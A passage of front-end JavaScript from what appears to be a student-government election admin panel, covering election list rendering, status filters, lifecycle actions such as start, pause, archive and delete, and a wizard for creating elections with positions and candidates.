            <button class="btn btn-secondary" onclick="duplicateElection(${e.id})" title="Copy this election into a new draft">Duplicate</button>
            ${e.status !== 'ongoing' ? `<button class="btn btn-danger" onclick="deleteElection(${e.id})">Delete</button>` : ''}
        `;

    return `
    <div class="election-card status-${e.status}">
        <div class="card-top-row">
            <span class="status-large ${statusClass(e.status)}"><span class="status-dot"></span>${statusLabel(e.status)}</span>
            ${syBadgeHtml(e.target_school_year_label)}
            ${remainingHtml}
        </div>
        <div style="display:flex;align-items:flex-start;gap:.85rem;">
            <div class="election-logo-badge">${electionLogoHtml(e.type, e.department)}</div>
            <div>
                <h2 class="election-title">${escapeHtml(e.name)}</h2>
                <div class="election-sub">${e.type === 'SSG' ? 'Supreme Student Government' : 'Department Student Government — ' + escapeHtml(e.department || '')}</div>
            </div>
        </div>
        <div class="schedule-box">
            <div class="schedule-field">
                <label>Start</label>
                <input type="datetime-local" id="start_${e.id}" value="${e.start_date.replace(' ', 'T')}" ${schedEditable ? '' : 'disabled'}>
            </div>
            <div class="schedule-field">
                <label>End</label>
                <input type="datetime-local" id="end_${e.id}" value="${e.end_date.replace(' ', 'T')}" ${schedEditable ? '' : 'disabled'}>
            </div>
            ${schedEditable ? `<button class="btn btn-secondary" onclick="saveSchedule(${e.id})">${isDraft ? 'Save Schedule (activates it)' : 'Save Schedule'}</button>` : ''}
        </div>
        <div class="card-actions">
            <div class="action-group-primary">${primaryActions}</div>
            <div class="action-group-secondary">${secondaryActions}</div>
        </div>
    </div>`;
}

function renderElectionList(){
    const container = document.getElementById('panel-election');
    const visibleElections = currentElections.filter(e => e.status !== 'archived');

    let listHtml = '';
    let wizardHtml = '<div id="electionWizardView" style="display:none;"></div>';

    if (!visibleElections.length) {
        listHtml = `
            <div id="electionListView">
                <div class="panel-flex-header">
                    <h2 class="section-title" style="margin:0;">Elections</h2>
                    <div style="display:flex;gap:.6rem;flex-wrap:wrap;">
                        <button class="btn btn-secondary" onclick="openNextSchoolYearModal()">Archive All &amp; Start New Cycle</button>
                        <button class="btn btn-primary" onclick="openCreateElection()">+ Create New Election</button>
                    </div>
                </div>
                <div class="coming-soon">No elections yet. Create one to get started.</div>
            </div>
        `;
    } else {
        // Election School Year filter — narrows to one target school year
        // before the status grouping below, since elections are usually
        // created a year ahead and it's easy to lose track of which batch
        // is for which year once a few pile up.
        const syCounts = {};
        visibleElections.forEach(e => {
            const key = e.target_school_year_id || 'none';
            syCounts[key] = (syCounts[key] || 0) + 1;
        });
        const syKnown = [...new Set(visibleElections.map(e => e.target_school_year_id).filter(Boolean))]
            .map(id => schoolYearOptions.find(sy => sy.id === id))
            .filter(Boolean)
            .sort((a,b) => b.start_year - a.start_year);
        if (electionSchoolYearFilter !== 'all' && !syCounts[electionSchoolYearFilter]) electionSchoolYearFilter = 'all';

        const syFilterBar = syKnown.length > 1 ? `
            <div class="form-row" style="max-width:260px;margin-bottom:1rem;">
                <label>Election School Year</label>
                <select onchange="electionSchoolYearFilter=this.value; renderElectionList();">
                    <option value="all">All (${visibleElections.length})</option>
                    ${syKnown.map(sy => `<option value="${sy.id}" ${String(electionSchoolYearFilter)===String(sy.id)?'selected':''}>${escapeHtml(sy.label)} (${syCounts[sy.id]||0})</option>`).join('')}
                </select>
            </div>` : '';

        const syFilteredElections = electionSchoolYearFilter === 'all'
            ? visibleElections
            : visibleElections.filter(e => String(e.target_school_year_id) === String(electionSchoolYearFilter));

        // Group elections by status (Ongoing → Paused → Upcoming → Drafts →
        // Ended) instead of leaving them in raw API order, where a mixed
        // batch of statuses reads as random clutter. A filter bar lets the
        // admin narrow to just one status when the list gets long.
        const statusCounts = {};
        syFilteredElections.forEach(e => { statusCounts[e.status] = (statusCounts[e.status] || 0) + 1; });
        if (electionStatusFilter !== 'all' && !statusCounts[electionStatusFilter]) electionStatusFilter = 'all';

        const filterPills = ['all', ...ELECTION_STATUS_ORDER.filter(s => statusCounts[s])].map(s => {
            const isAll = s === 'all';
            const selected = electionStatusFilter === s;
            const label = isAll ? 'All' : ELECTION_STATUS_GROUP_LABEL[s];
            const count = isAll ? syFilteredElections.length : statusCounts[s];
            return `<button class="${selected ? 'selected' : ''}" onclick="electionStatusFilter='${s}'; renderElectionList();">${isAll ? '' : `<span class="dot" style="background:${ELECTION_STATUS_DOT_COLOR[s]};"></span>`}${label}<span class="fbadge">${count}</span></button>`;
        }).join('');

        const filteredElections = electionStatusFilter === 'all' ? syFilteredElections : syFilteredElections.filter(e => e.status === electionStatusFilter);

        let groupsHtml = '';
        ELECTION_STATUS_ORDER.forEach(status => {
            const group = filteredElections.filter(e => e.status === status);
            if (!group.length) return;
            groupsHtml += `
                <div class="election-group-header">
                    <span class="dot ${status}"></span>
                    <span class="label">${ELECTION_STATUS_GROUP_LABEL[status]}</span>
                    <span class="count">${group.length}</span>
                </div>
                <div class="election-cards">${group.map(renderElectionCard).join('')}</div>
            `;
        });

        listHtml = `
            <div id="electionListView">
                <div class="panel-flex-header">
                    <h2 class="section-title" style="margin:0;">Elections</h2>
                    <div style="display:flex;gap:.6rem;flex-wrap:wrap;">
                        <button class="btn btn-secondary" onclick="openNextSchoolYearModal()">Archive All &amp; Start New Cycle</button>
                        <button class="btn btn-primary" onclick="openCreateElection()">+ Create New Election</button>
                    </div>
                </div>
                ${syFilterBar}
                ${Object.keys(statusCounts).length > 1 ? `<div class="election-filter-bar">${filterPills}</div>` : ''}
                ${groupsHtml}
            </div>
        `;
    }

    container.innerHTML = listHtml + wizardHtml;
}

// ------------------------------------------------------------------
// ELECTION LIFECYCLE ACTIONS (Start/Pause/End/Delete/Save Schedule/
// View Results) — these send lightweight PATCH-style PUT requests
// (no "positions" key in the body) so the API only touches the field
// that changed instead of requiring the full position/candidate roster.
// ------------------------------------------------------------------
async function electionPatch(id, extra){
    try {
        const res = await fetch(ELECTIONS_API, {
            method: 'PUT',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({csrf_token: CSRF_TOKEN, id, ...extra})
        });
        const data = await res.json();
        if (!res.ok || data.error) { showToast(data.error || 'Action failed.', 'error'); return false; }
        return true;
    } catch (e) { showToast('Network error. Please try again.', 'error'); return false; }
}

async function saveSchedule(id){
    const startEl = document.getElementById('start_' + id);
    const endEl = document.getElementById('end_' + id);
    const start = startEl.value;
    const end = endEl.value;
    if (!start || !end) { showToast('Please set both a start and end date/time.', 'warning'); return; }
    if (new Date(end) <= new Date(start)) { showToast('End time must be after the start time.', 'warning'); return; }
    const e = currentElections.find(e => e.id === id);
    const ok = await electionPatch(id, {start, end});
    if (!ok) return;
    addLog(`Updated schedule for "${e ? e.name : 'election'}" (${fmtDateTime(start)} → ${fmtDateTime(end)})`);
    showToast('Schedule saved.', 'success');
    await loadElectionList();
}

async function startElection(id){
    const e = currentElections.find(e => e.id === id);
    const ok = await electionPatch(id, {status: 'ongoing'});
    if (!ok) return;
    addLog(`Started election: ${e ? e.name : id}`);
    showToast(`"${e ? e.name : 'Election'}" is now open for voting.`, 'success');
    await loadElectionList();
}
async function pauseElection(id){
    const e = currentElections.find(e => e.id === id);
    const ok = await electionPatch(id, {status: 'paused'});
    if (!ok) return;
    addLog(`Paused election: ${e ? e.name : id}`);
    showToast(`"${e ? e.name : 'Election'}" paused.`, 'info');
    await loadElectionList();
}
async function endElection(id){
    const e = currentElections.find(e => e.id === id);
    const confirmed = await showConfirmModal({
        title: 'End this election now?',
        message: `Voting for "${e ? e.name : 'this election'}" will be closed immediately, before its scheduled end time.`,
        confirmLabel: 'End Election',
    });
    if (!confirmed) return;
    const ok = await electionPatch(id, {status: 'closed'});
    if (!ok) return;
    addLog(`Ended election: ${e ? e.name : id}`);
    showToast(`"${e ? e.name : 'Election'}" has been ended.`, 'success');
    await loadElectionList();
}
async function setElectionVisibility(id, visibility){
    const e = currentElections.find(e => e.id === id);
    const ok = await electionPatch(id, {results_visibility: visibility});
    if (!ok) return;
    addLog(`Set results visibility for "${e ? e.name : id}" to "${visibility}"`);
    showToast('Results visibility updated.', 'success');
    await loadElectionList();
    if (document.getElementById('panel-results').classList.contains('active')) renderResults();
}

// Duplicates an election into a brand-new DRAFT copy (Batch C1): the
// copy gets fresh position/candidate rows and NO votes, so it is a
// clean slate for the next cycle with the same roster. Photos survive
// the copy (data URLs are re-validated, legacy assets/ paths pass
// through saveCandidatePhoto unchanged).
async function duplicateElection(id){
    const e = currentElections.find(e => e.id === id);
    const confirmed = await showConfirmModal({
        title: 'Duplicate this election?',
        message: `"${e ? e.name : 'This election'}" will be copied as a new DRAFT election with the same positions and candidates but no votes. You can then rename and schedule the copy.`,
        confirmLabel: 'Create Copy',
        danger: false,
    });
    if (!confirmed) return;
    try {
        const res = await fetch(ELECTIONS_API, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({csrf_token: CSRF_TOKEN, duplicateOf: id})
        });
        const data = await res.json();
        if (!res.ok || data.error) { showToast(data.error || 'Duplicate failed.', 'error'); return; }
        addLog(`Duplicated election: ${e ? e.name : id}`);
        showToast(`Draft copy created${data.id ? ' (election #' + data.id + ')' : ''}.`, 'success');
        await loadElectionList();
    } catch (err) { showToast('Network error. Please try again.', 'error'); }
}
async function deleteElection(id){
    const e = currentElections.find(e => e.id === id);
    const confirmed = await showConfirmModal({
        title: 'Delete this election?',
        message: `Deleting "${e ? e.name : 'this election'}" permanently removes its positions, candidates, and any votes already cast. This cannot be undone.`,
        confirmLabel: 'Delete Election',
    });
    if (!confirmed) return;
    try {
        const res = await fetch(ELECTIONS_API, {
            method: 'DELETE',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({csrf_token: CSRF_TOKEN, id, confirm_delete: true})
        });
        const data = await res.json();
        if (!res.ok || data.error) { showToast(data.error || 'Delete failed.', 'error'); return; }
    } catch (err) { showToast('Network error. Please try again.', 'error'); return; }
    addLog(`Deleted election: ${e ? e.name : id}`);
    showToast('Election deleted.', 'success');
    await loadElectionList();
}

async function archiveElection(id){
    const e = currentElections.find(e => e.id === id);
    const confirmed = await showConfirmModal({
        title: 'Archive this election?',
        message: `"${e ? e.name : 'This election'}" will move out of the Elections list and into Archive. You can restore it later.`,
        confirmLabel: 'Archive',
        danger: false,
    });
    if (!confirmed) return;
    const ok = await electionPatch(id, {status: 'archived'});
    if (!ok) return;
    addLog(`Archived election: ${e ? e.name : id}`);
    showToast('Election archived.', 'success');
    await loadElectionList();
}
async function unarchiveElection(id){
    const e = currentElections.find(e => e.id === id);
    const ok = await electionPatch(id, {status: 'closed'});
    if (!ok) return;
    addLog(`Restored election from archive: ${e ? e.name : id}`);
    showToast('Election restored to the Elections list.', 'success');
    await loadElectionList();
    // The Restore button lives in the Archive panel, which renders from
    // its own fetch (renderArchive) — separate from the Elections list
    // above. Refresh it too when it's the visible panel, or the restored
    // card stays on screen until the admin switches panels or reloads.
    if (document.getElementById('panel-archive').classList.contains('active')) {
        await renderArchive();
    }
}

// ------------------------------------------------------------------
// "NEXT SCHOOL YEAR ELECTION" — the once-a-year bulk rollover: archives
// every election, advances the active school year, and recomputes every
// student's year level (auto-graduating anyone who crosses 4 years with
// no lifecycle flag set). See api/next-school-year.php.
// ------------------------------------------------------------------
async function openNextSchoolYearModal(){
    await loadSettingsData(true); // make sure schoolYearOptions/activeSchoolYear are current
    const currentLabel = (activeSchoolYear || {}).label || 'the current school year';

    const overlay = document.createElement('div');
    overlay.className = 'modal-overlay';
    overlay.innerHTML = `
        <div class="modal-box" role="alertdialog" aria-modal="true">
            <div class="modal-icon danger">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
            </div>
            <h3>Archive all current elections?</h3>
            <p>This clears the Elections list for a fresh cycle by archiving every election that isn't already archived — it is a cleanup button only. It does <strong>not</strong> advance the school year (that changes automatically every June 1) and does <strong>not</strong> change any student's year level — students track that themselves (automatically if Normal, or via "Update Year Level" on their dashboard). Current school year: <strong>${escapeHtml(currentLabel)}</strong>. This cannot be undone.</p>
            <div class="modal-actions">
                <button type="button" class="btn btn-secondary" data-choice="cancel">Cancel</button>
                <button type="button" class="btn btn-danger" data-choice="confirm">Archive Elections</button>
            </div>
        </div>
    `;
    function close(){ overlay.remove(); }
    overlay.addEventListener('click', e => { if (e.target === overlay) close(); });
    overlay.querySelector('[data-choice="cancel"]').addEventListener('click', close);
    overlay.querySelector('[data-choice="confirm"]').addEventListener('click', async () => {
        const btn = overlay.querySelector('[data-choice="confirm"]');
        btn.disabled = true;
        btn.innerHTML = '<span class="btn-spinner dark"></span> Archiving…';
        try {
            const res = await fetch(NEXT_SCHOOL_YEAR_API, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({csrf_token: CSRF_TOKEN})
            });
            const data = await res.json();
            close();
            if (res.ok && data.success) {
                addLog(`Ran "Archive All & Start New Cycle": archived ${data.archived_elections} election(s) (current school year: ${data.current_school_year}).`);
                showToast(`Archived ${data.archived_elections} election(s) for ${data.current_school_year}.`, 'success', {duration: 7000});
                await loadElectionList();
                if (document.getElementById('panel-logs').classList.contains('active')) renderLogs();
            } else {
                showToast(data.error || 'Could not archive the elections.', 'error');
            }
        } catch (e) {
            close();
            showToast('Network error. Please try again.', 'error');
        }
    });
    document.body.appendChild(overlay);
}

function viewElectionResults(id){
    showPanel('results', id);
}

function blankDraft(){
    const now = new Date();
    const start = now.toISOString().slice(0,16);
    const end = new Date(now.getTime() + 7*24*60*60*1000).toISOString().slice(0,16);
    // Elections are run FOR the upcoming school year (officers elected now
    // take office once it starts) — default the badge to the next school
    // year computed from the client SY clock (e.g. created in 2026-2027 ->
    // "SY 2027-2028"). The API stamps the matching target_school_year_id
    // on save via ensureSchoolYearForLabel, so no id lookup is needed here.
    // IMPORTANT: never compare the settings API's start_year (a JSON string)
    // against the client helper's number with === — String(2027) !== 2027,
    // which is how this badge previously broke and always showed "—".
    const nextStart = nextSchoolYearStartYearClient();
    return {
        id: null, type: null, department: '', name: '',
        status: 'scheduled',
        start: start,
        end: end,
        resultsVisibility: 'after',
        targetSchoolYearLabel: (nextStart + '-' + (nextStart + 1)),
        partiesEnabled: false, parties: [],
        // Start with one blank position row so it actually matches what the
        // "Number of Positions" input displays (1) — leaving this as an
        // empty array meant nothing rendered in the table until the admin
        // manually changed the number, even though it already said "1".
        positions: [
            {
                title: '',
                candidates: [
                    {name:'', photo:'', candidate_year:'', department:'', platform:'', party:''}
                ],
                winner_count: 1,
                year_restriction: ''
            }
        ],
        candidates: [],
    };
}

function openCreateElection(){
    wizardDraft = blankDraft();
    wizardOriginalSnapshot = JSON.stringify(wizardDraft);
    wizardStep = 1;
    wizardInvalidFields = new Set();
    const listView = document.getElementById('electionListView');
    const wizardView = document.getElementById('electionWizardView');
    if (listView) listView.style.display = 'none';
    if (wizardView) {
        wizardView.style.display = 'block';
        renderWizard();
    }
}

async function editElection(id){
    try {
        const res = await fetch(`${ELECTIONS_API}?id=${id}`);
        const data = await res.json();
        wizardDraft = {
            id: data.id,
            type: data.type,
            department: data.department,
            name: data.name,
            status: data.status,
            start: data.start_date.replace(' ', 'T'),
            end: data.end_date.replace(' ', 'T'),
            resultsVisibility: data.results_visibility,
            targetSchoolYearLabel: data.target_school_year_label || '',
            partiesEnabled: !!data.parties_enabled,
            parties: data.parties || [],
            positions: data.positions.map(p => ({
                position_id: p.position_id,
                title: p.title,
                winner_count: p.winner_count,
                candidate_limit: p.candidate_limit,
                year_restriction: p.year_restriction,
                candidates: p.candidates || []
            })),
        };
        wizardDraft.positions.forEach(pos => {
            pos.candidates = pos.candidates.map(c => ({
                id: c.id,
                name: c.name,
                photo: c.photo,
                candidate_year: c.candidate_year,
                department: c.department,
                platform: c.platform,
                party: c.party,
            }));
        });
        wizardStep = 1;
        wizardInvalidFields = new Set();
        wizardOriginalSnapshot = JSON.stringify(wizardDraft);
        const listView = document.getElementById('electionListView');
        const wizardView = document.getElementById('electionWizardView');
        if (listView) listView.style.display = 'none';
        if (wizardView) {
            wizardView.style.display = 'block';
            renderWizard();
        }
    } catch (e) {
        showToast('Could not load election for editing.', 'error');
    }
}

async function cancelWizard(){
    if (wizardIsDirty() && !(await showConfirmModal({
        title: 'Discard unsaved changes?',
        message: 'You have unsaved changes in this election. Leaving now will discard them.',
        confirmLabel: 'Discard & Leave',
    }))) {
        return;
    }
    wizardDraft = null;
    wizardOriginalSnapshot = null;
    const listView = document.getElementById('electionListView');
    const wizardView = document.getElementById('electionWizardView');
    if (listView) listView.style.display = 'block';
    if (wizardView) wizardView.style.display = 'none';
    loadElectionList();
}

function renderWizard(){
    const container = document.getElementById('electionWizardView');
    if (!container) return;
    if (wizardStep === 1) {
        container.innerHTML = wizardStep1HTML();
        bindWizardRowDrag(); // the positions table lives on step 1
    } else if (wizardStep === 2) {
        container.innerHTML = wizardStep2HTML();
    }
}

function wizardStep1HTML(){
    const typeChoice = `
        <div class="type-choice-row">
            <div class="type-choice ${wizardDraft.type==='DSG'?'selected':''}" onclick="selectType('DSG')">
                <div class="tc-icon">🏛</div>
                <h3>Department Student Government</h3>
                <p>Positions and candidates scoped to a single department.</p>
            </div>
            <div class="type-choice ${wizardDraft.type==='SSG'?'selected':''}" onclick="selectType('SSG')">
                <div class="tc-icon">🎓</div>
                <h3>Supreme Student Government</h3>
                <p>School-wide positions open to all departments.</p>
            </div>
        </div>`;

    let setup = '';
    if (wizardDraft.type) {
        const deptField = wizardDraft.type === 'DSG' ? `
            <div class="form-row">
                <label>Faculty</label>
                <select id="w_department" class="${wizardInvalidFields.has('w_department')?'field-invalid':''}" onchange="wizardDraft.department=this.value">
                    <option value="">Select faculty</option>
                    ${departmentOptions.map(d => { const v = escapeHtml(d); return `<option value="${v}" ${wizardDraft.department===d?'selected':''}>${v}</option>`; }).join('')}
                </select>
                ${wizardInvalidFields.has('w_department') ? '<div class="field-error-msg">Select a department for this DSG election.</div>' : ''}
            </div>` : '';

        const partiesHtml = `
            <div class="wizard-section">
                <h3>Parties</h3>
                <div class="toggle-switch ${wizardDraft.partiesEnabled?'on':''}" onclick="toggleParties()">
                    <div class="track"></div>
                    <span>${wizardDraft.partiesEnabled ? 'Parties enabled' : 'Parties disabled (independent candidates only)'}</span>
                </div>
                ${wizardDraft.partiesEnabled ? `
                <div class="party-input-list" id="partyInputs">
                    ${wizardDraft.parties.map((p,i) => `
                        <div style="display:flex;gap:.5rem;align-items:center;">
                            <input type="text" placeholder="Party ${i+1} name" maxlength="100" value="${escapeHtml(p)}" onchange="wizardDraft.parties[${i}]=this.value" style="flex:1;">
                            <button type="button" class="btn btn-danger btn-sm" title="Remove party" onclick="removePartyField(${i})">✕</button>
                        </div>`).join('')}
                    <button class="btn btn-secondary btn-sm" onclick="addPartyField()">+ Add Party</button>
                </div>` : ''}
            </div>`;

        const positionsHtml = `
            <div class="wizard-section">
                <h3>Positions</h3>
                <div class="form-row" style="max-width:220px;">
                    <label>Number of Positions</label>
                    <input type="number" min="1" max="20" value="${wizardDraft.positions.length || 1}" onchange="setPositionCount(this.value)">
                </div>
                <table class="pos-table" id="positionsTable">
                    <thead><tr><th style="width:60px;"></th><th>Position</th><th style="width:130px;">Candidates</th><th style="width:110px;">Winners</th><th style="width:170px;">Limit to see</th></tr></thead>
                    <tbody>
                        ${wizardDraft.positions.map((p,i) => `
                        <tr data-idx="${i}">
                            <td>
                                <div style="display:flex;gap:.2rem;align-items:center;">
                                    <span class="drag-handle" title="Hold and drag to reorder">⠿</span>
                                    <button type="button" class="btn btn-secondary btn-sm" title="Move up" ${i===0?'disabled':''} onclick="movePosition(${i}, -1)" style="padding:0 .5rem;">↑</button>
                                    <button type="button" class="btn btn-secondary btn-sm" title="Move down" ${i===wizardDraft.positions.length-1?'disabled':''} onclick="movePosition(${i}, 1)" style="padding:0 .5rem;">↓</button>
                                </div>
                            </td>
                            <td><input type="text" id="pos_title_${i}" class="${wizardInvalidFields.has('pos_title_'+i)?'field-invalid':''}" placeholder="e.g. President" maxlength="50" value="${escapeHtml(p.title)}" onchange="wizardDraft.positions[${i}].title=this.value"></td>
                            <td><input type="number" id="pos_cands_${i}" class="${wizardInvalidFields.has('pos_cands_'+i)?'field-invalid':''}" min="1" value="${p.candidates.length || 1}" onchange="updateCandidateCount(${i}, this.value)"></td>
                            <td><input type="number" id="pos_winners_${i}" class="${wizardInvalidFields.has('pos_winners_'+i)?'field-invalid':''}" min="1" value="${p.winner_count || 1}" onchange="wizardDraft.positions[${i}].winner_count=parseInt(this.value)||1"></td>
                            <td>
                                <select onchange="wizardDraft.positions[${i}].year_restriction=this.value">
                                    <option value="">Everyone</option>
                                    ${yearOptions.map(y => `<option value="${y}" ${p.year_restriction===y?'selected':''}>${y}</option>`).join('')}
                                </select>
                            </td>
                        </tr>`).join('')}
                    </tbody>
                </table>
                ${wizardInvalidFields.size ? '<p class="field-error-msg" style="margin-top:.6rem;">Highlighted position fields above need attention.</p>' : ''}
            </div>`;

        setup = `
            <div class="wizard-section">
                <h3>Basic Info</h3>
                ${deptField}
                <div class="form-row">
                    <label>Election Name</label>
                    <input type="text" id="w_name" class="${wizardInvalidFields.has('w_name')?'field-invalid':''}" maxlength="100" value="${escapeHtml(wizardDraft.name)}" placeholder="e.g. SSG Election 2026" oninput="wizardDraft.name=this.value">
                    ${wizardInvalidFields.has('w_name') ? '<div class="field-error-msg">Election name is required.</div>' : ''}
                </div>
                <div class="form-row">
                    <label>Target School Year</label>
                    <div class="auto-sy-display" style="display:flex;align-items:center;gap:.5rem;padding:.55rem .75rem;border:1px solid var(--border);border-radius:8px;background:var(--bg-secondary);">
                        ${syBadgeHtml(wizardDraft.targetSchoolYearLabel || '—')}
                        <span style="font-size:.78rem;color:var(--muted);">Automatic — elections always target the upcoming school year.</span>
                    </div>
                </div>
            </div>
            ${partiesHtml}
            ${positionsHtml}
            <div class="wizard-footer">
                ${(!wizardDraft.id || wizardDraft.status === 'draft') ? `<button class="btn btn-secondary" onclick="saveDraftElection()">Save as Draft</button>` : '<div></div>'}
                <button class="btn btn-primary" onclick="goToCandidates()">Next: Candidates &rarr;</button>
            </div>`;
    }

    return `
        <div class="wizard-topbar">
            <button class="back-btn" onclick="cancelWizard()">&larr; Cancel</button>
            <h2 class="section-title" style="margin:0;flex:1;">${wizardDraft.id ? 'Edit Election' : 'Create New Election'}</h2>
            ${wizardDraft.type ? syBadgeHtml(wizardDraft.targetSchoolYearLabel || '') : ''}
        </div>
        ${typeChoice}
        <div id="setupSection">${setup}</div>
    `;
}

function selectType(type){
    wizardDraft.type = type;
    if (type === 'SSG') wizardDraft.department = '';
    renderWizard();
}

function toggleParties(){
    wizardDraft.partiesEnabled = !wizardDraft.partiesEnabled;
    if (wizardDraft.partiesEnabled && wizardDraft.parties.length === 0) {
        wizardDraft.parties = ['Party 1', 'Party 2'];
    }
    renderWizard();
}
function addPartyField(){
    wizardDraft.parties.push('');
    renderWizard();
}
function removePartyField(i){
    wizardDraft.parties.splice(i, 1);
    renderWizard();
}
function movePosition(i, direction){
    const target = i + direction;
    if (target < 0 || target >= wizardDraft.positions.length) return;
    const arr = wizardDraft.positions;
    [arr[i], arr[target]] = [arr[target], arr[i]];
    renderWizard();
}
// Drag-commit for the wizard position rows: read back the DOM order the
// shared attachRowDrag helper produced, then re-render (same path the
// arrow buttons take, so wizard state never forks).
function commitWizardDragOrder(){
    const tbody = document.querySelector('#positionsTable tbody');
    if (!tbody) return;
    const order = Array.from(tbody.querySelectorAll('tr')).map(r => parseInt(r.dataset.idx, 10));
    wizardDraft.positions = order.map(k => wizardDraft.positions[k]);
    renderWizard();
}
function bindWizardRowDrag(){
    const tbody = document.querySelector('#positionsTable tbody');
    if (!tbody) return;
    tbody.querySelectorAll('tr').forEach(row => {
        const handle = row.querySelector('.drag-handle');
        if (handle) attachRowDrag(handle, row, tbody, commitWizardDragOrder);
    });
}
function setPositionCount(n){
    n = Math.max(1, Math.min(20, parseInt(n) || 1));
    const current = wizardDraft.positions;
    wizardDraft.positions = Array.from({length:n}, (_,i) => {
        if (current[i]) {
            return current[i];
        } else {
            // New position: initialize with 1 empty candidate (single-
            // candidate positions must be the easy default — see Task 9)
            return {
                title: '',
                candidates: [
                    {name:'', photo:'', candidate_year:'', department:'', platform:'', party:''}
                ],
                winner_count: 1,
                year_restriction: ''
            };
        }
    });
    renderWizard();
}
function updateCandidateCount(posIdx, n){
    n = Math.max(1, parseInt(n) || 1);
    const pos = wizardDraft.positions[posIdx];
    const current = pos.candidates || [];
    pos.candidates = Array.from({length:n}, (_,i) => current[i] || {name:'', photo:'', candidate_year:'', department:'', platform:'', party:''});
    renderWizard();
}

function goToCandidates(){
    wizardInvalidFields = new Set();
    const messages = [];

    // Read name
    const name = document.getElementById('w_name')?.value.trim();
    if (!name) { wizardInvalidFields.add('w_name'); messages.push('Election name is required.'); }
    wizardDraft.name = name || wizardDraft.name;

    // Department for DSG
    if (wizardDraft.type === 'DSG') {
        const dep = document.getElementById('w_department')?.value;
        if (!dep) { wizardInvalidFields.add('w_department'); messages.push('Select a department for DSG.'); }
        else {
            wizardDraft.department = dep;
            // Auto-fill the election's faculty onto all candidates for DSG
            wizardDraft.positions.forEach(pos => {
                if (pos.candidates) {
                    pos.candidates.forEach(cand => { cand.department = dep; });
                }
            });
        }
    }

    // Validate positions — collect every problem instead of stopping at
    // the first one, so the admin can fix everything in one pass.
    wizardDraft.positions.forEach((p,i) => {
        if (!p.title.trim()) { wizardInvalidFields.add('pos_title_'+i); messages.push(`Position #${i+1} needs a name.`); }
        const candCount = p.candidates.length;
        if (candCount < 1) { wizardInvalidFields.add('pos_cands_'+i); messages.push(`Position "${p.title || i+1}" needs at least 1 candidate.`); }
        const winners = p.winner_count || 1;
        if (winners > candCount) { wizardInvalidFields.add('pos_winners_'+i); messages.push(`Position "${p.title || i+1}" can't have more winners (${winners}) than candidates (${candCount}).`); }
    });

    if (messages.length) {
        renderWizard();
        showWizardError(messages.length === 1 ? messages[0] : `Please fix ${messages.length} issues: ${messages.join(' ')}`);
        return;
    }

    wizardStep = 2;
    renderWizard();
}

function wizardStep2HTML(){
    let sections = '';
    wizardDraft.positions.forEach((pos, key) => {
        const title = pos.title || 'Position';
        const partyOptions = ['No Party / Independent', ...(wizardDraft.parties.filter(p => p.trim()))];

        let candidatesHtml = '';
        pos.candidates.forEach((cand, ci) => {
            candidatesHtml += `
            <div class="candidate-block">
                <h4>Candidate ${ci+1}</h4>
                <div class="candidate-photo-row">
                    <img id="preview_${key}_${ci}" src="${escapeHtml(cand.photo || '')}" onerror="this.style.opacity=0" style="opacity:${cand.photo?1:0};width:64px;height:64px;object-fit:cover;border-radius:50%;background:#e2e8f0;">
                    <div>
                        <label style="font-size:.8rem;font-weight:600;display:block;margin-bottom:.3rem;">Photo</label>
                        <input type="file" accept="image/*" onchange="handlePhotoUpload(event, ${key}, ${ci})">
                    </div>
                </div>
                <div class="two-col">
                    <div class="form-row">
                        <label>Full Name</label>
                        <input type="text" id="cand_name_${key}_${ci}" class="${wizardInvalidFields.has('cand_name_'+key+'_'+ci)?'field-invalid':''}" maxlength="100" value="${escapeHtml(cand.name)}" onchange="wizardDraft.positions[${key}].candidates[${ci}].name=this.value">
                        ${wizardInvalidFields.has('cand_name_'+key+'_'+ci) ? '<div class="field-error-msg">Name is required.</div>' : ''}
                    </div>
                    <div class="form-row">
                        <label>Party</label>
                        ${wizardDraft.partiesEnabled ?
                            `<select onchange="wizardDraft.positions[${key}].candidates[${ci}].party=this.value">
                                ${partyOptions.map(p => `<option value="${escapeHtml(p)}" ${cand.party===p?'selected':''}>${escapeHtml(p)}</option>`).join('')}
                             </select>` :
                            `<input type="text" value="No Party / Independent" disabled>`}
                    </div>
                    <div class="form-row">
                        <label>Faculty</label>
                        ${wizardDraft.type === 'DSG' && wizardDraft.department
                            ? `<input type="text" value="${escapeHtml(wizardDraft.department)}" disabled style="background:var(--surface-2);color:var(--muted);">
                               <input type="hidden" id="cand_department_${key}_${ci}" value="${escapeHtml(wizardDraft.department)}" onchange="wizardDraft.positions[${key}].candidates[${ci}].department=this.value">`
                            : `<select id="cand_department_${key}_${ci}" class="${wizardInvalidFields.has('cand_department_'+key+'_'+ci)?'field-invalid':''}" onchange="wizardDraft.positions[${key}].candidates[${ci}].department=this.value">
                                <option value="">Select faculty</option>
                                ${departmentOptions.map(d => { const v = escapeHtml(d); return `<option value="${v}" ${cand.department===d?'selected':''}>${v}</option>`; }).join('')}
                              </select>
                              ${wizardInvalidFields.has('cand_department_'+key+'_'+ci) ? '<div class="field-error-msg">Faculty is required.</div>' : ''}`
                        }
                    </div>
                    <div class="form-row">
                        <label>Year Level</label>
                        <select onchange="wizardDraft.positions[${key}].candidates[${ci}].candidate_year=this.value">
                            ${yearOptions.map(y => `<option value="${y}" ${cand.candidate_year===y?'selected':''}>${y}</option>`).join('')}
                        </select>
                    </div>
                </div>
                <div class="form-row">
                    <label>Platform</label>
                    <textarea onchange="wizardDraft.positions[${key}].candidates[${ci}].platform=this.value">${escapeHtml(cand.platform)}</textarea>
                </div>
            </div>`;
        });

        sections += `
        <div class="wizard-section">
            <h3 style="margin-bottom:1rem;">${escapeHtml(title)}</h3>
            ${candidatesHtml}
        </div>`;
    });

    return `
        <div class="wizard-topbar">
            <button class="back-btn" onclick="wizardStep=1; wizardInvalidFields=new Set(); renderWizard();">&larr; Back</button>
            <h2 class="section-title" style="margin:0;flex:1;">Add Candidate Details</h2>
